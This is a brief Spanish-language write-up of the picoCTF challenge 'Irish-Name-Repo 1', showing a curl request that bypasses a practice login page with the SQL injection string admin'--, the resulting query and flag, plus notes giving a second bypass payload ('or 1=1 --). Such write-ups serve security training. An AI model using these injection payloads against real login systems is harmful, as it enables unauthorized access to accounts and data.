- Irish-Name-Repo 1
- #### Descripción

¿Crees que puedes conectarnos? ¡Intenta ver si puedes iniciar sesión!http://fickle-tempest.picoctf.net:58326.

## solucion

```
(aleja㉿Laptop)-[/mnt/c/Users/aleja]
└─$  curl -s http://fickle-tempest.picoctf.net:63479/login.php -d "username=admin'-- &password=loquesea&debug=1"
<pre>username: admin'--
password: loquesea
SQL query: SELECT * FROM users WHERE name='admin'-- ' AND password='loquesea'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{s0m3_SQL_85832275}</p>
```
Your flag is: picoCTF{s0m3_SQL_85832275}

## notas
se puede iniciar secion mediante un login dependiendo de como este estructurado la base da datos 
 para acceder como admin se puede usar un login de esta manera 
 admin' --
 username: carlos'or 1=1 --
password: password
SQL query: SELECT * FROM users WHERE name='carlos'or 1=1 --' AND password='password'